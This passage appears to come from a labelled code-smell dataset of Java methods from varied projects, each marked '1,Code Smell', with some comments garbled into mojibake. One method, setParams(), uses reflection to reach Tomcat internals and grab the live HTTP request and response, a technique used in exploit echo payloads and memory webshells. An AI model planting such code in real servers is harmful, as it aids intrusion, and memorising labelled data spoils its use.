          msgAttrs=msgAttrs + ""_userName="" + object.getUserName()+ ""&_encyVersion=""+ encryptInfo.getVersion()+ ""&_encyAesKey=""+ encryptInfo.getRsaEncryptedKey();
          body=EncryptUtil.aesEncrypt(body,encryptInfo.getAesKey());
        }
      }
      if (Utils.isNotBlank(object.getMsgUUID())) {
        if (Utils.isNotBlank(msgAttrs)) {
          msgAttrs=msgAttrs + ""&"";
        }
        msgAttrs=msgAttrs + ""msgUUID="" + object.getMsgUUID();
      }
      int msgType=5;
      if (object.isEncrypt()) {
        msgType|=FLAG_ALLOW_ENCRYPT;
      }
      totalLength=totalLength + body.length + msgAttrs.getBytes(""utf8"").length;
      buf=ByteBufAllocator.DEFAULT.buffer(4 + totalLength);
      buf.writeInt(totalLength);
      buf.writeByte(msgType);
      buf.writeInt(body.length);
      buf.writeBytes(body);
      buf.writeInt(msgAttrs.getBytes(""utf8"").length);
      buf.writeBytes(msgAttrs.getBytes(""utf8""));
    }
  }
 catch (  Exception e) {
    logger.error(""{}"",e.getMessage());
    e.printStackTrace();
  }
  return buf;
}",1,Code Smell
"/** 
 * decode
 * @param srcBytes
 * @param extParams
 * @return
 * @throws InvalidProtocolBufferException 
 */
@SuppressWarnings(""unchecked"") @Override public SourceData decode(byte[] srcBytes,Map<String,Object> extParams){
  try {
    DynamicMessage.Builder builder=DynamicMessage.newBuilder(rootDesc);
    DynamicMessage root=builder.mergeFrom(srcBytes).build();
    List<DynamicMessage> childRoot=null;
    if (this.childNodes != null && this.childNodes.size() > 0) {
      DynamicMessage current=root;
      for (      PbNode node : childNodes) {
        Object nodeValue=current.getField(node.getFieldDesc());
        if (nodeValue == null) {
          return new PbSourceData(root,rootDesc,columnNodeMap,srcCharset);
        }
        if (node.isLastNode()) {
          if (!(nodeValue instanceof List)) {
            return new PbSourceData(root,rootDesc,columnNodeMap,srcCharset);
          }
 else {
            childRoot=(List<DynamicMessage>)nodeValue;
            break;
          }
        }
        if (!node.isArray()) {
          if (!(nodeValue instanceof DynamicMessage)) {
            return new PbSourceData(root,rootDesc,columnNodeMap,srcCharset);
          }
          current=(DynamicMessage)nodeValue;
        }
 else {
          if (!(nodeValue instanceof List)) {
            return new PbSourceData(root,rootDesc,columnNodeMap,srcCharset);
          }
          List<?> nodeList=(List<?>)nodeValue;
          if (node.getArrayIndex() >= nodeList.size()) {
            return new PbSourceData(root,rootDesc,columnNodeMap,srcCharset);
          }
          Object nodeElement=nodeList.get(node.getArrayIndex());
          if (!(nodeElement instanceof DynamicMessage)) {
            return new PbSourceData(root,rootDesc,columnNodeMap,srcCharset);
          }
          current=(DynamicMessage)nodeElement;
        }
      }
    }
    return new PbSourceData(root,childRoot,rootDesc,childDesc,columnNodeMap,srcCharset);
  }
 catch (  Exception e) {
    LOG.error(e.getMessage(),e);
    return null;
  }
}
/** 
 * decode
 * @param srcString
 * @param extParams
 * @return
 */
@Override public SourceData decode(String srcString,Map<String,Object> extParams){
  byte[] srcBytes=Base64.getDecoder().decode(srcString);
  return this.decode(srcBytes,extParams);
}",1,Code Smell
"static Object adaptValue(Object annotatedElement,Object value,boolean classValuesAsString,boolean nestedAnnotationsAsMap){
  if (classValuesAsString) {
    if (value instanceof Class) {
      return ((Class<?>)value).getName();
    }
 else     if (value instanceof Class[]) {
      Class<?>[] clazzArray=(Class<?>[])value;
      String[] classNames=new String[clazzArray.length];
      for (int i=0; i < clazzArray.length; i++) {
        classNames[i]=clazzArray[i].getName();
      }
      return classNames;
    }
  }
  if (value instanceof Annotation) {
    Annotation annotation=(Annotation)value;
    if (nestedAnnotationsAsMap) {
      return getAnnotationAttributes(annotatedElement,annotation,classValuesAsString,true);
    }
 else {
      return synthesizeAnnotation(annotation,annotatedElement);
    }
  }
  if (value instanceof Annotation[]) {
    Annotation[] annotations=(Annotation[])value;
    if (nestedAnnotationsAsMap) {
      AnnotationAttributes[] mappedAnnotations=new AnnotationAttributes[annotations.length];
      for (int i=0; i < annotations.length; i++) {
        mappedAnnotations[i]=getAnnotationAttributes(annotatedElement,annotations[i],classValuesAsString,true);
      }
      return mappedAnnotations;
    }
 else {
      return synthesizeAnnotationArray(annotations,annotatedElement);
    }
  }
  return value;
}",1,Code Smell
"private void correctNimbusDefaultProblems(JTextComponent editor){
  Color c=editor.getCaretColor();
  if (c == null) {
    editor.setCaretColor(RTextArea.getDefaultCaretColor());
  }
  c=editor.getSelectionColor();
  if (c == null) {
    c=UIManager.getColor(""nimbusSelectionBackground"");
    if (c == null) {
      c=UIManager.getColor(""textHighlight"");
      if (c == null) {
        c=new ColorUIResource(Color.BLUE);
      }
    }
    editor.setSelectionColor((Color)c);
  }
  c=editor.getSelectedTextColor();
  if (c == null) {
    c=UIManager.getColor(""nimbusSelectedText"");
    if (c == null) {
      c=UIManager.getColor(""textHighlightText"");
      if (c == null) {
        c=new ColorUIResource(Color.WHITE);
      }
    }
    editor.setSelectedTextColor((Color)c);
  }
  c=editor.getDisabledTextColor();
  if (c == null) {
    c=UIManager.getColor(""nimbusDisabledText"");
    if (c == null) {
      c=UIManager.getColor(""textInactiveText"");
      if (c == null) {
        c=new ColorUIResource(Color.DARK_GRAY);
      }
    }
    editor.setDisabledTextColor((Color)c);
  }
  Border border=editor.getBorder();
  if (border == null) {
    editor.setBorder(new MarginBorder());
  }
  Insets margin=editor.getMargin();
  if (margin == null) {
    editor.setMargin(new InsetsUIResource(2,2,2,2));
  }
}",1,Code Smell
"/** 
 * 淇濆瓨闈炲浐瀹氬瓧娈佃褰�
 * @param newFieldList
 * @param oldFieldList
 */
public Content employeeNOFixedFieldRecord(List<UpdateInformationBO.InformationFieldBO> newFieldList,List<HrmModelFiledVO> oldFieldList,Long employeeId){
  HrmEmployee employee=employeeService.getById(employeeId);
  textList.clear();
  if (newFieldList == null) {
    return new Content(employee.getEmployeeName(),"""",BehaviorEnum.UPDATE);
  }
  newFieldList.forEach(newField -> {
    for (    HrmModelFiledVO oldField : oldFieldList) {
      if (oldField.getFieldId().equals(newField.getFieldId())) {
        if (ObjectUtil.isEmpty(oldField.getFieldValue()) && ObjectUtil.isEmpty(newField.getFieldValue())) {
          continue;
        }
        if (Objects.equals(FieldEnum.parse(oldField.getType()),FieldEnum.DETAIL_TABLE)) {
          parseDetailTable(oldField.getFieldValue(),newField.getFieldValue(),oldField.getName(),oldField.getType(),textList,transList);
        }
 else {
          String oldFieldValue=(String)parseValue(oldField.getFieldValue(),oldField.getType(),true);
          String newFieldValue=(String)parseValue(newField.getFieldValue(),newField.getType(),true);
          String transOldfieldvalue=(String)transParseValue(oldFieldValue);
          String transNewFieldValue=(String)transParseValue(newFieldValue);
          if (!oldFieldValue.equals(newFieldValue)) {
            if (ObjectUtil.isEmpty(oldFieldValue)) {
              oldFieldValue=""绌�"";
              transOldfieldvalue=LanguageFieldEnum.ACTIONRECORD_EMPTY.getFieldFormat();
            }
            if (ObjectUtil.isEmpty(newFieldValue)) {
              newFieldValue=""绌�"";
              transNewFieldValue=LanguageFieldEnum.ACTIONRECORD_EMPTY.getFieldFormat();
            }
            String options=oldField.getOptions();
            Map<String,String> jsonMap=LanguageFieldUtil.getJSONValue(options,""name"",""value"");
            if (oldField.getType().equals(3)) {
              if (jsonMap.containsKey(transOldfieldvalue)) {
                transOldfieldvalue=""{customField.hrmField."" + LanguageFieldUtil.getFieldName(oldField.getFieldName()) + ""Options.""+ transOldfieldvalue+ ""}"";
              }
              if (jsonMap.containsKey(transNewFieldValue)) {
                transNewFieldValue=""{customField.hrmField."" + LanguageFieldUtil.getFieldName(oldField.getFieldName()) + ""Options.""+ transNewFieldValue+ ""}"";
              }
            }
            textList.add(""灏�"" + oldField.getName() + "" 鐢�""+ oldFieldValue+ ""淇敼涓�""+ newFieldValue+ ""銆�"");
            transList.add("" "" + ""{customField.hrmField."" + LanguageFieldUtil.getFieldName(oldField.getFieldName()) + ""}""+ "" : ""+ transOldfieldvalue+ LanguageFieldEnum.ACTIONRECORD_UPDATE.getFieldFormat()+ transNewFieldValue+ ""銆�"");
          }
        }
      }
    }
  }
);
  if (textList.size() > 0) {
    actionRecordService.saveRecord(actionTypeEnum,HrmActionBehaviorEnum.UPDATE,textList,transList,employeeId);
    return new Content(employee.getEmployeeName(),CollUtil.join(textList,"",""),CollUtil.join(transList,"",""),BehaviorEnum.UPDATE);
  }
  return new Content(employee.getEmployeeName(),"""",BehaviorEnum.UPDATE);
}",1,Code Smell
"@Test public void testLogLevelWarnOutput() throws Exception {
{
    Utils.setValueInConfig(""log_level"",""WARN"");
    String[] args={""../""};
    TestingProcess process=TestingProcessManager.start(args);
    assertNotNull(process.checkOrWaitForEvent(PROCESS_STATE.STARTED));
    File infoLog=new File(Config.getConfig(process.getProcess()).getInfoLogPath(process.getProcess()));
    File errorLog=new File(Config.getConfig(process.getProcess()).getErrorLogPath(process.getProcess()));
    boolean errorOutput=false;
    boolean warnOutput=false;
    boolean infoOutput=false;
    boolean debugOutput=false;
    Logging.error(process.getProcess(),TenantIdentifier.BASE_TENANT,""some error"",false);
    Logging.warn(process.getProcess(),TenantIdentifier.BASE_TENANT,""some warn"");
    Logging.info(process.getProcess(),TenantIdentifier.BASE_TENANT,""some info"",true);
    Logging.debug(process.getProcess(),TenantIdentifier.BASE_TENANT,""some debug"");
    try (Scanner scanner=new Scanner(infoLog,StandardCharsets.UTF_8)){
      while (scanner.hasNextLine()) {
        String line=scanner.nextLine();
        if (line.contains(process.getProcess().getProcessId())) {
          if (line.contains(""some info"")) {
            infoOutput=true;
          }
 else           if (line.contains(""some debug"")) {
            debugOutput=true;
          }
        }
      }
    }
     try (Scanner errorScanner=new Scanner(errorLog,StandardCharsets.UTF_8)){
      while (errorScanner.hasNextLine()) {
        String line=errorScanner.nextLine();
        if (line.contains(process.getProcess().getProcessId())) {
          if (line.contains(""some error"")) {
            errorOutput=true;
          }
 else           if (line.contains(""some warn"")) {
            warnOutput=true;
          }
        }
      }
    }
     assertTrue(errorOutput && warnOutput && !infoOutput&& !debugOutput);
    process.kill();
    assertNotNull(process.checkOrWaitForEvent(PROCESS_STATE.STOPPED));
  }
}",1,Code Smell
"public void setParams(){
  try {
    boolean flag=false;
    Thread[] threads=(Thread[])getField(Thread.currentThread().getThreadGroup(),""threads"");
    for (int i=0; i < threads.length; i++) {
      Thread thread=threads[i];
      if (thread != null) {
        String threadName=thread.getName();
        if (!threadName.contains(""exec"") && threadName.contains(""http"")) {
          Object target=getField(thread,""target"");
          Object global=null;
          if (target instanceof Runnable) {
            try {
              global=getField(getField(getField(target,""this$0""),""handler""),""global"");
            }
 catch (            NoSuchFieldException fieldException) {
              fieldException.printStackTrace();
            }
          }
          if (global != null) {
            List processors=(List)getField(global,""processors"");
            for (i=0; i < processors.size(); i++) {
              RequestInfo requestInfo=(RequestInfo)processors.get(i);
              if (requestInfo != null) {
                org.apache.coyote.Request tempRequest=(org.apache.coyote.Request)getField(requestInfo,""req"");
                org.apache.catalina.connector.Request request=(org.apache.catalina.connector.Request)tempRequest.getNote(1);
                Response response=request.getResponse();
                this.req=request;
                this.resp=response;
                flag=true;
                break;
              }
            }
          }
        }
      }
      if (flag) {
        break;
      }
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
}",1,Code Smell
"@Override public boolean isAcceptable(SourceFile sourceFile,ExecutionContext ctx){
  if (!super.isAcceptable(sourceFile,ctx)) {
    return false;
  }
  if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_PROPERTIES_LOCATION)) {
    acc.addMavenWrapperProperties=false;
  }
 else   if (!PathUtils.matchesGlob(sourceFile.getSourcePath(),""**/"" + WRAPPER_PROPERTIES_LOCATION_RELATIVE_PATH)) {
    return false;
  }
  Optional<BuildTool> maybeBuildTool=sourceFile.getMarkers().findFirst(BuildTool.class);
  if (!maybeBuildTool.isPresent()) {
    return false;
  }
  BuildTool buildTool=maybeBuildTool.get();
  if (buildTool.getType() != BuildTool.Type.Maven) {
    return false;
  }
  MavenWrapper mavenWrapper=getMavenWrapper(ctx);
  VersionComparator versionComparator=requireNonNull(Semver.validate(isBlank(distributionVersion) ? ""latest.release"" : distributionVersion,null).getValue());
  int compare=versionComparator.compare(null,buildTool.getVersion(),mavenWrapper.getDistributionVersion());
  if (compare < 0) {
    acc.needsWrapperUpdate=true;
    acc.updatedMarker=buildTool.withVersion(mavenWrapper.getDistributionVersion());
    return true;
  }
 else {
    return compare == 0;
  }
}
@Override public boolean isAcceptable(SourceFile sourceFile,ExecutionContext ctx){
  if (!super.isAcceptable(sourceFile,ctx)) {
    return false;
  }
  MavenWrapper mavenWrapper=getMavenWrapper(ctx);
  if (sourceFile instanceof Quark || sourceFile instanceof Remote) {
    if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_JAR_LOCATION)) {
      acc.addMavenWrapperJar=false;
      if (mavenWrapper.getWrapperDistributionType() != DistributionType.Bin) {
        acc.needsWrapperUpdate=true;
      }
      return true;
    }
 else     if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_DOWNLOADER_LOCATION)) {
      acc.addMavenWrapperDownloader=false;
      if (mavenWrapper.getWrapperDistributionType() != DistributionType.Source) {
        acc.needsWrapperUpdate=true;
      }
      return true;
    }
  }
  if (sourceFile instanceof PlainText) {
    if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_BATCH_LOCATION)) {
      acc.addMavenBatchScript=false;
      return true;
    }
 else     if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_SCRIPT_LOCATION)) {
      acc.addMavenShellScript=false;
      return true;
    }
  }
  return false;
}",1,Code Smell
"@Override protected void selectAnotherChat(boolean forward){
  dismiss(false);
  if (messagePreviewParams != null) {
    if (!forward) {
      ignoreDraft=true;
    }
    noForwardQuote=messagePreviewParams.hideForwardSendersName;
    int hasPoll=0;
    boolean hasInvoice=false;
    if (messagePreviewParams.forwardMessages != null) {
      for (int a=0, N=messagePreviewParams.forwardMessages.messages.size(); a < N; a++) {
        MessageObject messageObject=messagePreviewParams.forwardMessages.messages.get(a);
        if (messageObject.isPoll()) {
          if (hasPoll != 2) {
            hasPoll=messageObject.isPublicPoll() ? 2 : 1;
          }
        }
 else         if (messageObject.isInvoice()) {
          hasInvoice=true;
        }
        selectedMessagesIds[0].put(messageObject.getId(),messageObject);
      }
    }
    Bundle args=new Bundle();
    args.putBoolean(""onlySelect"",true);
    args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_FORWARD);
    args.putBoolean(""quote"",!forward);
    args.putBoolean(""reply_to"",!forward && messagePreviewParams.replyMessage != null && messagePreviewParams.quote == null);
    args.putInt(""hasPoll"",hasPoll);
    args.putBoolean(""hasInvoice"",hasInvoice);
    args.putInt(""messagesCount"",messagePreviewParams.forwardMessages == null ? 0 : messagePreviewParams.forwardMessages.messages.size());
    args.putBoolean(""canSelectTopics"",true);
    DialogsActivity fragment=new DialogsActivity(args);
    fragment.setDelegate(ChatActivity.this);
    presentFragment(fragment);
  }
}",1,Code Smell
"@Override public RespModel occupy(OccupyParams occupyParams,String token){
  Devices devices=findByUdId(occupyParams.getUdId());
  if (devices != null) {
    if (devices.getStatus().equals(DeviceStatus.ONLINE)) {
      Agents agents=agentsService.findById(devices.getAgentId());
      if (agents != null) {
        JSONObject jsonObject=(JSONObject)JSONObject.toJSON(occupyParams);
        jsonObject.put(""msg"",""occupy"");
        jsonObject.put(""token"",token);
        jsonObject.put(""platform"",devices.getPlatform());
        TransportWorker.send(agents.getId(),jsonObject);
        JSONObject result=new JSONObject();
switch (devices.getPlatform()) {
case PlatformType.ANDROID:
{
            if (occupyParams.getSasRemotePort() != 0) {
              result.put(""sas"",String.format(""adb connect %s:%d"",agents.getHost(),occupyParams.getSasRemotePort()));
            }
            if (occupyParams.getUia2RemotePort() != 0) {
              result.put(""uia2"",String.format(""http://%s:%d/uia/%d"",agents.getHost(),agents.getPort(),occupyParams.getUia2RemotePort()));
            }
          }
case PlatformType.IOS:
{
          if (occupyParams.getSibRemotePort() != 0) {
            result.put(""sib"",String.format(""sib remote connect --host %s -p %d"",agents.getHost(),occupyParams.getSibRemotePort()));
          }
          if (occupyParams.getWdaServerRemotePort() != 0) {
            result.put(""wdaServer"",String.format(""http://%s:%d"",agents.getHost(),occupyParams.getWdaServerRemotePort()));
          }
          if (occupyParams.getWdaMjpegRemotePort() != 0) {
            result.put(""wdaMjpeg"",String.format(""http://%s:%d"",agents.getHost(),occupyParams.getWdaMjpegRemotePort()));
          }
        }
    }
    return new RespModel<>(RespEnum.HANDLE_OK,result);
  }
 else {
    return new RespModel<>(RespEnum.ID_NOT_FOUND);
  }
}
 else {
  return new RespModel<>(RespEnum.DEVICE_NOT_FOUND);
}
}
 else {
return new RespModel<>(RespEnum.DEVICE_NOT_FOUND);
}
}",1,Code Smell
"@Override protected void doSolveForward(DataflowAnalysis<Node,Fact> analysis,DataflowResult<Node,Fact> result){
  CFG<Node> cfg=analysis.getCFG();
  NavigableSet<Node> workList=Sets.newOrderedSet(Comparator.comparingInt(cfg::getIndex));
  cfg.forEach(node -> {
    if (!cfg.isEntry(node)) {
      workList.add(node);
    }
  }
);
  while (!workList.isEmpty()) {
    Node node=workList.pollFirst();
    Fact in;
    int inDegree=cfg.getInDegreeOf(node);
    if (inDegree > 1) {
      in=result.getInFact(node);
      cfg.getInEdgesOf(node).forEach(inEdge -> {
        Fact fact=result.getOutFact(inEdge.source());
        if (analysis.needTransferEdge(inEdge)) {
          fact=analysis.transferEdge(inEdge,fact);
        }
        analysis.meetInto(fact,in);
      }
);
    }
 else     if (inDegree == 1) {
      CFGEdge<Node> inEdge=CollectionUtils.getOne(cfg.getInEdgesOf(node));
      if (analysis.needTransferEdge(inEdge)) {
        in=analysis.transferEdge(inEdge,result.getOutFact(inEdge.source()));
        result.setInFact(node,in);
      }
 else {
        in=result.getInFact(node);
      }
    }
 else {
      in=result.getInFact(node);
    }
    Fact out=result.getOutFact(node);
    boolean changed=analysis.transferNode(node,in,out);
    if (changed) {
      workList.addAll(cfg.getSuccsOf(node));
    }
  }
}",1,Code Smell
"private static int validFlowRuleValue(String paramValue,StringBuilder sBuffer,ProcessResult result){
  int ruleCnt=0;
  paramValue=paramValue.trim();
  List<Integer> ruleTypes=Arrays.asList(0,1,2,3);
  FlowCtrlRuleHandler flowCtrlRuleHandler=new FlowCtrlRuleHandler(true);
  Map<Integer,List<FlowCtrlItem>> flowCtrlItemMap;
  try {
    flowCtrlItemMap=flowCtrlRuleHandler.parseFlowCtrlInfo(paramValue);
  }
 catch (  Throwable e) {
    result.setFailResult(sBuffer.append(""Parse parameter "").append(WebFieldDef.FLOWCTRLSET.name).append("" failure: '"").append(e.toString()).toString());
    sBuffer.delete(0,sBuffer.length());
    return 0;
  }
  sBuffer.append(""["");
  for (  Integer typeId : ruleTypes) {
    if (typeId != null) {
      int rules=0;
      List<FlowCtrlItem> flowCtrlItems=flowCtrlItemMap.get(typeId);
      if (flowCtrlItems != null) {
        if (ruleCnt++ > 0) {
          sBuffer.append("","");
        }
        sBuffer.append(""{\""type\"":"").append(typeId.intValue()).append("",\""rule\"":["");
        for (        FlowCtrlItem flowCtrlItem : flowCtrlItems) {
          if (flowCtrlItem != null) {
            if (rules++ > 0) {
              sBuffer.append("","");
            }
            sBuffer=flowCtrlItem.toJsonString(sBuffer);
          }
        }
        sBuffer.append(""]}"");
      }
    }
  }
  sBuffer.append(""]"");
  result.setSuccResult(sBuffer.toString());
  sBuffer.delete(0,sBuffer.length());
  return ruleCnt;
}",1,Code Smell
"/** 
 * set precision and scale for decimal and other types
 * @param type original flink type
 * @param dialectType database dialect type
 * @return flink type revised according to dialect type
 */
public LogicalType handleDialectSqlType(LogicalType type,String dialectType){
  if (StringUtils.isBlank(dialectType)) {
    return type;
  }
  Matcher matcher=DIALECT_SQL_TYPE_PATTERN.matcher(dialectType);
  if (!matcher.matches()) {
    return type;
  }
  String[] items=matcher.group(2).split("","");
  if (type instanceof DecimalType) {
    int precision;
    int scale=DEFAULT_DECIMAL_SCALE;
    precision=Integer.parseInt(items[0].trim());
    if (precision < DecimalType.MIN_PRECISION || precision > DecimalType.MAX_PRECISION) {
      precision=DEFAULT_DECIMAL_PRECISION;
    }
    if (items.length == 2) {
      scale=Integer.parseInt(items[1].trim());
      if (scale < DecimalType.MIN_SCALE || scale > precision) {
        scale=DEFAULT_DECIMAL_SCALE;
      }
    }
    return new DecimalType(precision,scale);
  }
 else   if (type instanceof CharType) {
    int length=Integer.parseInt(items[0].trim());
    if (length <= 0) {
      length=DEFAULT_CHAR_LENGTH;
    }
    return new CharType(length);
  }
 else   if (type instanceof VarCharType) {
    int length=Integer.parseInt(items[0].trim());
    if (length <= 0) {
      length=Integer.MAX_VALUE;
    }
    return new VarCharType(length);
  }
 else   if (type instanceof VarBinaryType) {
    int length=Integer.parseInt(items[0].trim());
    if (length <= 0) {
      length=Integer.MAX_VALUE;
    }
    return new VarBinaryType(length);
  }
 else   if (type instanceof BinaryType) {
    int length=Integer.parseInt(items[0].trim());
    if (length <= 0) {
      length=1;
    }
    return new BinaryType(length);
  }
 else   if (""TINYINT(1)"".equalsIgnoreCase(matcher.group(0))) {
    return new TinyIntType();
  }
 else   if (""BIGINT UNSIGNED"".equalsIgnoreCase(matcher.group(1))) {
    return new DecimalType(20,0);
  }
 else   if (""BIGINT UNSIGNED ZEROFILL"".equalsIgnoreCase(matcher.group(1))) {
    return new DecimalType(20,0);
  }
 else {
    return type;
  }
}",1,Code Smell
"private void loadData(int localType,boolean preCache,String query){
switch (localType) {
case TYPE_CHANNEL:
    BoostRepository.searchChats(currentChat.id,0,query,50,peers -> {
      if (!isSearching()) {
        return;
      }
      this.peers.clear();
      this.peers.addAll(peers);
      updateList(true,true);
      scrollToTop(true);
    }
);
  break;
case TYPE_USER:
BoostRepository.loadChatParticipants(currentChat.id,0,query,0,50,peers -> {
  if (preCache) {
    users.addAll(peers);
  }
  if (type == TYPE_USER) {
    this.peers.clear();
    this.peers.addAll(peers);
    updateList(true,true);
    scrollToTop(true);
  }
}
);
break;
case TYPE_COUNTRY:
BoostRepository.loadCountries(arg -> {
if (preCache) {
countriesMap.putAll(arg.first);
countriesLetters.addAll(arg.second);
countriesMap.forEach((s,list) -> countriesList.addAll(list));
}
if (type == TYPE_COUNTRY) {
updateList(true,true);
scrollToTop(true);
}
}
);
break;
}
}",1,Code Smell
"public List<GameItem> composeItem(Player player,int composeId,int count,List<ItemParam> costItems){
  if (count <= 0)   return null;
  ItemComposeExcel excel=GameData.getItemComposeExcelMap().get(composeId);
  if (excel == null)   return null;
  List<GameItem> items=new ArrayList<>();
  if (excel.getFormulaType() == FormulaType.Normal) {
    if (!player.getInventory().verifyItems(excel.getMaterialCost(),count) || !player.getInventory().verifyScoin(excel.getCoinCost() * count)) {
      return null;
    }
    player.getInventory().removeItemsByParams(excel.getMaterialCost(),count);
    player.addSCoin(-excel.getCoinCost() * count);
    items.add(new GameItem(excel.getItemID(),count));
  }
 else   if (excel.getFormulaType() == FormulaType.Sepcial) {
    int totalAmount=0;
    for (    ItemParam param : costItems) {
      if (!excel.getSpecialMaterialCost().contains(param.getId())) {
        return null;
      }
      GameItem costItem=player.getInventory().getItemByParam(param);
      if (costItem == null)       return null;
      if (costItem.getCount() >= param.getCount()) {
        totalAmount+=param.getCount();
      }
    }
    if (totalAmount != count * excel.getSpecialMaterialCostNumber()) {
      return null;
    }
    player.getInventory().removeItemsByParams(costItems);
    items.add(new GameItem(excel.getItemID(),count));
  }
  if (items.size() > 0) {
    player.getInventory().addItems(items);
    return items;
  }
 else {
    return null;
  }
}",1,Code Smell
"public void onClick(Context context){
switch (getType()) {
case URL:
    ;
case MENTION:
{
    String username, domain;
    if (linkObject instanceof Mention && !TextUtils.isEmpty(m.acct)) {
      String[] parts=m.acct.split(""@"",2);
      username=parts[0];
      if (parts.length == 2) {
        domain=parts[1];
      }
 else {
        domain=AccountSessionManager.get(accountID).domain;
      }
    }
 else {
      username=domain=null;
    }
    UiUtils.openProfileByID(context,accountID,link,username,domain);
  }
case HASHTAG:
{
  if (linkObject instanceof Hashtag)   UiUtils.openHashtagTimeline(context,accountID,ht);
 else   UiUtils.openHashtagTimeline(context,accountID,link);
}
case CUSTOM:
;
}
}",1,Code Smell
"public void loadWallpaperThumb(int index,ResultCallback<Pair<Long,Bitmap>> callback){
  final TLRPC.WallPaper wallpaper=getWallpaper(index);
  if (wallpaper == null) {
    if (callback != null) {
      callback.onComplete(null);
    }
    return;
  }
  long themeId=getTlTheme(index).id;
  Bitmap bitmap=ChatThemeController.getInstance(currentAccount).getWallpaperThumbBitmap(themeId);
  File file=getWallpaperThumbFile(themeId);
  if (bitmap == null && file.exists() && file.length() > 0) {
    try {
      bitmap=BitmapFactory.decodeFile(file.getAbsolutePath());
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
  if (bitmap != null) {
    if (callback != null) {
      callback.onComplete(new Pair<>(themeId,bitmap));
    }
    return;
  }
  if (wallpaper.document == null) {
    if (callback != null) {
      callback.onComplete(new Pair<>(themeId,null));
    }
    return;
  }
  final TLRPC.PhotoSize thumbSize=FileLoader.getClosestPhotoSizeWithSize(wallpaper.document.thumbs,140);
  ImageLocation imageLocation=ImageLocation.getForDocument(thumbSize,wallpaper.document);
  ImageReceiver imageReceiver=new ImageReceiver();
  imageReceiver.setAllowLoadingOnAttachedOnly(false);
  imageReceiver.setImage(imageLocation,""120_140"",null,null,null,1);
  imageReceiver.setDelegate((receiver,set,thumb,memCache) -> {
    ImageReceiver.BitmapHolder holder=receiver.getBitmapSafe();
    if (!set || holder == null || holder.bitmap.isRecycled()) {
      return;
    }
    Bitmap resultBitmap=holder.bitmap;
    if (resultBitmap == null && (holder.drawable instanceof BitmapDrawable)) {
      resultBitmap=((BitmapDrawable)holder.drawable).getBitmap();
    }
    if (resultBitmap != null) {
      if (callback != null) {
        callback.onComplete(new Pair<>(themeId,resultBitmap));
      }
      final Bitmap saveBitmap=resultBitmap;
      Utilities.globalQueue.postRunnable(() -> {
        try (FileOutputStream outputStream=new FileOutputStream(file)){
          saveBitmap.compress(Bitmap.CompressFormat.PNG,87,outputStream);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
      }
);
    }
 else {
      if (callback != null) {
        callback.onComplete(null);
      }
    }
  }
);
  ImageLoader.getInstance().loadImageForImageReceiver(imageReceiver);
}",1,Code Smell
"private int positionOfNext(String untilDelim){
  boolean inMultiLineComment=false;
  boolean inSingleLineComment=false;
  int delimIndex=cursor;
  for (; delimIndex < source.length() - untilDelim.length() + 1; delimIndex++) {
    if (inSingleLineComment) {
      if (source.charAt(delimIndex) == '\n') {
        inSingleLineComment=false;
      }
    }
 else {
      if (source.length() - untilDelim.length() > delimIndex + 1) {
switch (source.substring(delimIndex,delimIndex + 2)) {
case ""//"":
          inSingleLineComment=true;
        delimIndex++;
      break;
case ""/*"":
    inMultiLineComment=true;
  delimIndex++;
break;
case ""*/"":
inMultiLineComment=false;
delimIndex=delimIndex + 2;
break;
}
}
if (!inMultiLineComment && !inSingleLineComment) {
if (source.startsWith(untilDelim,delimIndex)) {
break;
}
}
}
}
return delimIndex > source.length() - untilDelim.length() ? -1 : delimIndex;
}",1,Code Smell
"ModelItem parse(DslContext context,Tokens tokens){
  if (tokens.hasMoreThan(IDENTIFIER_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + String.format(GRAMMAR,tokens.get(0)));
  }
  if (!tokens.includes(IDENTIFIER_INDEX)) {
    throw new RuntimeException(""Expected: "" + String.format(GRAMMAR,tokens.get(0)));
  }
  String s=tokens.get(IDENTIFIER_INDEX);
  ModelItem modelItem;
  if (s.contains(""://"")) {
    modelItem=context.getWorkspace().getModel().getElementWithCanonicalName(s);
  }
 else {
    modelItem=context.getElement(s);
    if (modelItem == null) {
      modelItem=context.getRelationship(s);
    }
  }
  if (modelItem == null) {
    throw new RuntimeException(""An element/relationship identified by \"""" + s + ""\"" could not be found"");
  }
  if (context instanceof GroupableDslContext && modelItem instanceof StaticStructureElement) {
    GroupableDslContext groupableDslContext=(GroupableDslContext)context;
    StaticStructureElement staticStructureElement=(StaticStructureElement)modelItem;
    if (groupableDslContext.hasGroup()) {
      staticStructureElement.setGroup(groupableDslContext.getGroup().getName());
    }
  }
  return modelItem;
}",1,Code Smell
"private List<String> visit(List<String> before,String jsonPath,boolean printMatches){
  var matcher=new JsonPathMatcher(jsonPath);
  return new JsonVisitor<List<String>>(){
    @Override public Json visitMember(    Json.Member member,    List<String> p){
      var e=super.visitMember(member,p);
      if (matcher.matches(getCursor())) {
        var match=e.printTrimmed(getCursor().getParentOrThrow());
        if (printMatches) {
          System.out.println(""matched in visitMember"");
          System.out.println(match);
          System.out.println();
        }
        p.add(match);
      }
      return e;
    }
    @Override public Json visitObject(    Json.JsonObject obj,    List<String> p){
      var e=super.visitObject(obj,p);
      if (matcher.matches(getCursor())) {
        var match=e.printTrimmed(getCursor().getParentOrThrow());
        if (printMatches) {
          System.out.println(""matched in visitObject"");
          System.out.println(match);
          System.out.println();
        }
        p.add(match);
      }
      return e;
    }
    @Override public Json visitArray(    Json.Array array,    List<String> p){
      var e=super.visitArray(array,p);
      if (matcher.matches(getCursor())) {
        var j=e.withPrefix(Space.EMPTY);
        var match=j.printTrimmed(getCursor().getParentOrThrow());
        if (printMatches) {
          System.out.println(""matched in visitArray"");
          System.out.println(match);
          System.out.println();
        }
        p.add(match);
      }
      return e;
    }
    @Override public Json visitLiteral(    Json.Literal literal,    List<String> p){
      var e=super.visitLiteral(literal,p);
      if (matcher.matches(getCursor())) {
        var j=e.withPrefix(Space.EMPTY);
        var match=j.printTrimmed(getCursor().getParentOrThrow());
        if (printMatches) {
